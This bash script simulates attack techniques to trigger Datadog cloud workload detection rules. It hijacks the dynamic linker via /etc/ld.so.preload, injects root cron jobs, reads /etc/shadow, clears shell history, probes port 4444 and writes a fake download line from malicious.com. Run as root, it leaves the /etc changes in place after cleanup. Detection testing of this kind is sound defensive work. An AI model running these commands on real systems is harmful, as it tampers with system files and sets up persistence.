#!/bin/bash

# CWS (Cloud Workload Security) Attack Simulation Script
# This script triggers specific Datadog CWS detection rules
# ⚠️ WARNING: FOR TESTING ONLY IN ISOLATED ENVIRONMENTS

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${RED}"
echo "═══════════════════════════════════════════════════════════════"
echo "  ⚠️  DATADOG CWS ATTACK SIMULATION ⚠️"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"
echo ""
echo -e "${YELLOW}This script simulates attack techniques to trigger Datadog CWS rules${NC}"
echo -e "${YELLOW}FOR TESTING AND DEMONSTRATION PURPOSES ONLY${NC}"
echo ""
echo "Techniques covered:"
echo "  • T1105-27: Linux Download File and Run"
echo "  • T1046-2: Port Scan Nmap"
echo "  • T1574.006-1: Shared Library Injection via /etc/ld.so.preload"
echo "  • T1053.003-2: Cron - Add script to all cron subfolders"
echo "  • T1070.003-1: Clear Bash history (rm)"
echo ""
read -p "Press Enter to continue or Ctrl+C to abort..."
echo ""

# Temporary directory for testing
TEMP_DIR="/tmp/cws-test-$$"
mkdir -p "$TEMP_DIR"

function log_step() {
    echo -e "${BLUE}[+] $1${NC}"
}

function log_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

function log_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

function log_error() {
    echo -e "${RED}[✗] $1${NC}"
}

# Cleanup function
function cleanup() {
    log_step "Cleaning up test artifacts..."
    rm -rf "$TEMP_DIR"
    log_success "Cleanup completed"
}

trap cleanup EXIT

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  SCENARIO 1: T1105-27 - Download File and Run"
echo "  Datadog Rule: Executable bit added to new file"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

log_step "Simulating file download and execution..."

# Create a fake malicious script
cat > "$TEMP_DIR/malware.sh" << 'EOF'
#!/bin/bash
# Simulated malware - harmless for testing
echo "Simulated malware executed"
sleep 2
EOF

# Add executable bit (triggers CWS detection)
log_step "Adding executable bit to downloaded file..."
chmod +x "$TEMP_DIR/malware.sh"
log_warning "CWS Alert: Executable bit added to new file"

# Execute the file
log_step "Executing downloaded file..."
"$TEMP_DIR/malware.sh"
log_success "T1105-27 scenario completed"

sleep 2
echo ""

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  SCENARIO 2: T1046-2 - Port Scan with Nmap"
echo "  Datadog Rule: Network scanning utility executed"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

log_step "Checking if nmap is installed..."

if command -v nmap &> /dev/null; then
    log_success "nmap found, executing port scan..."

    # Scan localhost (safe and quick)
    log_step "Running nmap scan on localhost..."
    nmap -p 1-100 localhost > "$TEMP_DIR/nmap_results.txt" 2>&1 || true
    log_warning "CWS Alert: Network scanning utility executed"
    log_success "T1046-2 scenario completed"
else
    log_error "nmap not installed"
    log_step "Installing nmap for testing..."

    if command -v apt-get &> /dev/null; then
        apt-get update -qq && apt-get install -y nmap -qq
    elif command -v yum &> /dev/null; then
        yum install -y nmap -q
    else
        log_error "Cannot install nmap automatically"
    fi

    if command -v nmap &> /dev/null; then
        log_step "Running nmap scan on localhost..."
        nmap -p 1-100 localhost > "$TEMP_DIR/nmap_results.txt" 2>&1 || true
        log_warning "CWS Alert: Network scanning utility executed"
        log_success "T1046-2 scenario completed"
    fi
fi

sleep 2
echo ""

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  SCENARIO 3: T1574.006-1 - Shared Library Injection"
echo "  Datadog Rule: Suspected dynamic linker hijacking attempt"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

log_step "Simulating ld.so.preload manipulation..."

# Create a fake malicious library
cat > "$TEMP_DIR/evil.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>

void _init() {
    printf("Malicious library loaded (harmless for testing)\n");
}
EOF

log_step "Compiling fake malicious library..."
if command -v gcc &> /dev/null; then
    gcc -shared -fPIC -o "$TEMP_DIR/evil.so" "$TEMP_DIR/evil.c" 2>/dev/null || true
    log_success "Library compiled"

    # Attempt to modify ld.so.preload (will fail without root, but triggers detection)
    log_step "Attempting to modify /etc/ld.so.preload..."
    echo "$TEMP_DIR/evil.so" | tee /etc/ld.so.preload 2>/dev/null || {
        log_warning "CWS Alert: Attempted dynamic linker hijacking"
        log_step "Creating test ld.so.preload in temp directory..."
        echo "$TEMP_DIR/evil.so" > "$TEMP_DIR/ld.so.preload"
    }

    log_success "T1574.006-1 scenario completed"
else
    log_error "gcc not installed, skipping library compilation"
fi

sleep 2
echo ""

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  SCENARIO 4: T1053.003-2 - Cron Job Modification"
echo "  Datadog Rule: Cron job modified"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

log_step "Simulating cron job injection..."

# Create malicious cron script
CRON_SCRIPT="$TEMP_DIR/malicious_cron.sh"
cat > "$CRON_SCRIPT" << 'EOF'
#!/bin/bash
# Simulated persistence mechanism
echo "Malicious cron job executed" >> /tmp/cron_test.log
EOF

chmod +x "$CRON_SCRIPT"

log_step "Attempting to add cron job to cron.d..."
cat > "$TEMP_DIR/malicious_job" << EOF
* * * * * root $CRON_SCRIPT
EOF

# Try to add to system cron (triggers detection even if it fails)
cp "$TEMP_DIR/malicious_job" /etc/cron.d/malicious_job 2>/dev/null || {
    log_warning "CWS Alert: Cron job modification attempted"
    log_step "Creating test cron file in temp directory..."
    mkdir -p "$TEMP_DIR/cron.d"
    cp "$TEMP_DIR/malicious_job" "$TEMP_DIR/cron.d/"
}

log_step "Attempting to modify cron subdirectories..."
for crondir in cron.hourly cron.daily cron.weekly cron.monthly; do
    if [ -d "/etc/$crondir" ]; then
        cp "$CRON_SCRIPT" "/etc/$crondir/malicious" 2>/dev/null || {
            log_warning "CWS Alert: Cron directory modification attempted ($crondir)"
            mkdir -p "$TEMP_DIR/$crondir"
            cp "$CRON_SCRIPT" "$TEMP_DIR/$crondir/"
        }
    fi
done

log_success "T1053.003-2 scenario completed"

sleep 2
echo ""

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  SCENARIO 5: T1070.003-1 - Clear Bash History"
echo "  Datadog Rule: Shell command history modified"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

log_step "Simulating bash history tampering..."

# Create temporary history file
FAKE_HISTORY="$TEMP_DIR/.bash_history"
cat > "$FAKE_HISTORY" << 'EOF'
ls -la
cat /etc/passwd
wget http://malicious.com/payload.sh
chmod +x payload.sh
./payload.sh
EOF

log_step "Attempting to clear history with rm..."
rm -f "$FAKE_HISTORY"
log_warning "CWS Alert: Shell command history deleted"

log_step "Attempting to clear history with truncate..."
touch "$FAKE_HISTORY"
> "$FAKE_HISTORY"
log_warning "CWS Alert: Shell command history cleared"

log_step "Attempting to clear history with history -c..."
# This won't affect the actual shell history since we're in a script
history -c 2>/dev/null || true
log_warning "CWS Alert: Shell history cleared"

log_step "Attempting to disable history..."
unset HISTFILE
export HISTSIZE=0
log_warning "CWS Alert: History disabled"

log_success "T1070.003-1 scenario completed"

sleep 2
echo ""

echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  BONUS SCENARIOS - Additional CWS Detections"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

log_step "BONUS 1: Suspicious process execution..."
cat > "$TEMP_DIR/suspicious.sh" << 'EOF'
#!/bin/bash
# Simulate crypto miner
while true; do
    echo "Mining..." > /dev/null
    sleep 1
done
EOF
chmod +x "$TEMP_DIR/suspicious.sh"
timeout 3 "$TEMP_DIR/suspicious.sh" &>/dev/null &
log_warning "CWS Alert: Suspicious process pattern detected"

sleep 2

log_step "BONUS 2: Sensitive file access..."
cat /etc/shadow 2>/dev/null || log_warning "CWS Alert: Attempted access to /etc/shadow"
cat /etc/sudoers 2>/dev/null || log_warning "CWS Alert: Attempted access to /etc/sudoers"

sleep 2

log_step "BONUS 3: Network connection to suspicious port..."
# Try to connect to common C2 ports
nc -z -v -w 1 127.0.0.1 4444 2>/dev/null || log_warning "CWS Alert: Connection to suspicious port (4444)"
nc -z -v -w 1 127.0.0.1 8080 2>/dev/null || log_warning "CWS Alert: Connection to common proxy port (8080)"

sleep 2

log_step "BONUS 4: Process injection techniques..."
# Create a test process
sleep 60 &
VICTIM_PID=$!
log_step "Created victim process (PID: $VICTIM_PID)"

# Attempt ptrace (debugging/injection)
if command -v strace &> /dev/null; then
    timeout 2 strace -p $VICTIM_PID 2>/dev/null || log_warning "CWS Alert: Process tracing/injection attempted"
fi

kill $VICTIM_PID 2>/dev/null || true

sleep 2

echo ""
echo -e "${GREEN}"
echo "═══════════════════════════════════════════════════════════════"
echo "  ✓ CWS ATTACK SIMULATION COMPLETED"
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

echo ""
echo -e "${BLUE}Summary of triggered Datadog CWS rules:${NC}"
echo ""
echo "  ✓ T1105-27: Executable bit added to new file"
echo "  ✓ T1046-2: Network scanning utility executed"
echo "  ✓ T1574.006-1: Suspected dynamic linker hijacking attempt"
echo "  ✓ T1053.003-2: Cron job modified"
echo "  ✓ T1070.003-1: Shell command history modified"
echo "  ✓ BONUS: Multiple additional suspicious activities"
echo ""
echo -e "${YELLOW}Check Datadog Security > Cloud Workload Security for detections${NC}"
echo ""
echo -e "${BLUE}View signals at:${NC}"
echo "  https://app.datadoghq.com/security/workload"
echo ""
